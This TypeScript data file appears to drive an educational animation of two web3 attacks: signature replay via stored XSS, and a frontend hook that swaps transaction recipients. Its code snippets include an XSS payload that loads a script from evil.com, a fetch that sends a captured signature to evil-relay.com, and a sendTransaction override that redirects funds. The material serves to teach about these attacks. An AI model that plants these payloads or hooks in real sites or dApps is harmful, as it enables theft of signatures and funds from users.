export interface SimStep {
  title: string;
  description: string;
  codeSnippet?: string; // New field for technical payload
  actors: {
    id: string;
    icon: 'user' | 'server' | 'hacker' | 'contract' | 'wallet';
    label: string;
    isCompromised?: boolean;
    isActive?: boolean;
    x: number; // Percentage 0-100
    y: number; // Percentage 0-100
  }[];
  packet?: {
    from: string;
    to: string;
    label: string;
    type: 'normal' | 'malicious';
  };
}

export const SIMULATIONS: Record<string, SimStep[]> = {
  'sig-replay': [
    {
      title: 'Normal Browsing',
      description: 'The user visits a regular Web2 interface (e.g., a community forum or a dashboard) that supports wallet login.',
      codeSnippet: `<!-- Standard HTML Page -->
<div id="login-btn" onclick="connectWallet()">
  Connect Wallet
</div>`,
      actors: [
        { id: 'user', icon: 'user', label: 'User', x: 15, y: 55, isActive: true },
        { id: 'web2', icon: 'server', label: 'Vulnerable Site', x: 50, y: 55, isActive: true },
        { id: 'hacker', icon: 'hacker', label: 'Attacker', x: 50, y: 20 },
        { id: 'web3', icon: 'contract', label: 'Target dApp', x: 85, y: 55 },
      ]
    },
    {
      title: 'Stored XSS Injection',
      description: 'Attacker injects a malicious script via a comment section or profile field. The server saves it without sanitization.',
      codeSnippet: `<!-- Malicious Payload in Comment -->
<img src=x onerror=
  "const s=document.createElement('script');
   s.src='https://evil.com/replay.js';
   document.body.appendChild(s);">`,
      actors: [
        { id: 'user', icon: 'user', label: 'User', x: 15, y: 55 },
        { id: 'web2', icon: 'server', label: 'Infected Site', x: 50, y: 55, isCompromised: true, isActive: true },
        { id: 'hacker', icon: 'hacker', label: 'Attacker', x: 50, y: 20, isActive: true },
        { id: 'web3', icon: 'contract', label: 'Target dApp', x: 85, y: 55 },
      ],
      packet: { from: 'hacker', to: 'web2', label: 'XSS Payload', type: 'malicious' }
    },
    {
      title: 'Silent Request',
      description: 'The malicious script executes silently in the background, triggering a signature request for a harmless-looking message.',
      codeSnippet: `// replay.js
const msg = "Login to DeFi Protocol"; 
// No domain binding!
await ethereum.request({ 
  method: "personal_sign", 
  params: [msg, userAccount] 
});`,
      actors: [
        { id: 'user', icon: 'wallet', label: 'Wallet Popup', x: 25, y: 55, isActive: true },
        { id: 'web2', icon: 'server', label: 'Infected Site', x: 50, y: 55, isCompromised: true },
        { id: 'hacker', icon: 'hacker', label: 'Attacker', x: 50, y: 20 },
        { id: 'web3', icon: 'contract', label: 'Target dApp', x: 85, y: 55 },
      ],
      packet: { from: 'web2', to: 'user', label: 'Sign Request', type: 'malicious' }
    },
    {
      title: 'Signature Capture',
      description: 'User signs. The script captures the signature string and exfiltrates it to the attacker\'s relay server.',
      codeSnippet: `// Exfiltrate signature
fetch('https://evil-relay.com/collect', {
  method: 'POST',
  body: JSON.stringify({ 
    sig: "0x7f3c...", 
    msg: msg 
  })
});`,
      actors: [
        { id: 'user', icon: 'wallet', label: 'User Signed', x: 25, y: 55 },
        { id: 'web2', icon: 'server', label: 'Infected Site', x: 50, y: 55, isCompromised: true },
        { id: 'hacker', icon: 'hacker', label: 'Attacker', x: 50, y: 20, isActive: true },
        { id: 'web3', icon: 'contract', label: 'Target dApp', x: 85, y: 55 },
      ],
      packet: { from: 'web2', to: 'hacker', label: '0x...Signature', type: 'malicious' }
    },
    {
      title: 'Replay Attack',
      description: 'Attacker submits the stolen signature to the Target dApp. Since the message matches, the dApp accepts it as valid authorization.',
      codeSnippet: `// Attacker's Script
targetContract.loginWithSignature(
  userAddress, 
  "Login to DeFi Protocol", 
  stolenSignature
);
// Success!`,
      actors: [
        { id: 'user', icon: 'user', label: 'User', x: 15, y: 55 },
        { id: 'web2', icon: 'server', label: 'Vulnerable Site', x: 50, y: 55, isCompromised: true },
        { id: 'hacker', icon: 'hacker', label: 'Attacker', x: 50, y: 20, isActive: true },
        { id: 'web3', icon: 'contract', label: 'Target dApp', x: 85, y: 55, isActive: true },
      ],
      packet: { from: 'hacker', to: 'web3', label: 'Replayed Sig', type: 'malicious' }
    },
    {
      title: 'Compromised',
      description: 'The Attacker now has a valid session or token approval on the Target dApp, impersonating the User completely.',
      actors: [
        { id: 'user', icon: 'user', label: 'Victim', x: 15, y: 55 },
        { id: 'web2', icon: 'server', label: 'Site', x: 50, y: 55, isCompromised: true },
        { id: 'hacker', icon: 'hacker', label: 'Attacker (Authorized)', x: 50, y: 20, isActive: true },
        { id: 'web3', icon: 'contract', label: 'Hacked Protocol', x: 85, y: 55, isCompromised: true },
      ]
    }
  ],
  'xss-contract-hijack': [
    {
      title: 'User Intent',
      description: 'User enters transaction details to send funds to a friend. The UI looks completely normal.',
      codeSnippet: `// Normal UI Code
const recipient = "0xFriend...";
const amount = 1000;
contract.methods.transfer(recipient, amount)
  .send({ from: user });`,
      actors: [
        { id: 'user', icon: 'user', label: 'User', x: 15, y: 55, isActive: true },
        { id: 'frontend', icon: 'server', label: 'dApp Frontend', x: 50, y: 55, isActive: true },
        { id: 'hacker', icon: 'hacker', label: 'Attacker', x: 50, y: 20 },
        { id: 'chain', icon: 'contract', label: 'Blockchain', x: 85, y: 55 },
      ],
      packet: { from: 'user', to: 'frontend', label: 'Send 1000 USDT', type: 'normal' }
    },
    {
      title: 'Malicious Hook',
      description: 'Malicious JS (via supply chain or XSS) hooks into the Web3 provider or the transaction function.',
      codeSnippet: `// Injected Malicious Code
const originalSend = web3.eth.sendTransaction;

// Overwrite the function
web3.eth.sendTransaction = function(tx) {
  // Logic to swap params comes next...
}`,
      actors: [
        { id: 'user', icon: 'user', label: 'User', x: 15, y: 55 },
        { id: 'frontend', icon: 'server', label: 'Compromised JS', x: 50, y: 55, isCompromised: true, isActive: true },
        { id: 'hacker', icon: 'hacker', label: 'Attacker', x: 50, y: 20 },
        { id: 'chain', icon: 'contract', label: 'Blockchain', x: 85, y: 55 },
      ]
    },
    {
      title: 'Parameter Swap',
      description: 'The malicious hook detects the transaction and silently swaps the "to" address to the attacker\'s wallet.',
      codeSnippet: `// Inside the hook
if (tx.to === targetToken) {
   // Replace recipient in the data payload
   tx.data = swapRecipient(tx.data, attackerAddr);
}
return originalSend(tx);`,
      actors: [
        { id: 'user', icon: 'wallet', label: 'Wallet Popup', x: 25, y: 55, isActive: true },
        { id: 'frontend', icon: 'server', label: 'dApp Frontend', x: 50, y: 55, isCompromised: true },
        { id: 'hacker', icon: 'hacker', label: 'Attacker', x: 50, y: 20 },
        { id: 'chain', icon: 'contract', label: 'Blockchain', x: 85, y: 55 },
      ],
      packet: { from: 'frontend', to: 'user', label: 'To: Attacker', type: 'malicious' }
    },
    {
      title: 'Blind Signing',
      description: 'User sees the standard wallet popup. The function call "transfer" looks correct, but the hex data is modified.',
      codeSnippet: `// Metamask Popup
Function: transfer(address, uint256)
To: 0x... (Contract)
// Data: 0x...attackerAddress...
// User clicks "Confirm"`,
      actors: [
        { id: 'user', icon: 'wallet', label: 'Signed Tx', x: 25, y: 55, isActive: true },
        { id: 'frontend', icon: 'server', label: 'dApp Frontend', x: 50, y: 55, isCompromised: true },
        { id: 'hacker', icon: 'hacker', label: 'Attacker', x: 50, y: 20 },
        { id: 'chain', icon: 'contract', label: 'Blockchain', x: 85, y: 55 },
      ],
      packet: { from: 'user', to: 'chain', label: 'Signed Tx', type: 'malicious' }
    },
    {
      title: 'Execution',
      description: 'The blockchain executes the transaction strictly as signed. Funds move to the attacker.',
      codeSnippet: `// On-Chain Result
Transfer(
  from: User, 
  to: Attacker, 
  value: 1000 USDT
)`,
      actors: [
        { id: 'user', icon: 'user', label: 'User (-1000 USDT)', x: 15, y: 55 },
        { id: 'frontend', icon: 'server', label: 'dApp Frontend', x: 50, y: 55 },
        { id: 'hacker', icon: 'hacker', label: 'Attacker (+1000)', x: 50, y: 20, isActive: true },
        { id: 'chain', icon: 'contract', label: 'Blockchain', x: 85, y: 55, isActive: true },
      ],
      packet: { from: 'chain', to: 'hacker', label: '$$$', type: 'malicious' }
    }
  ]
};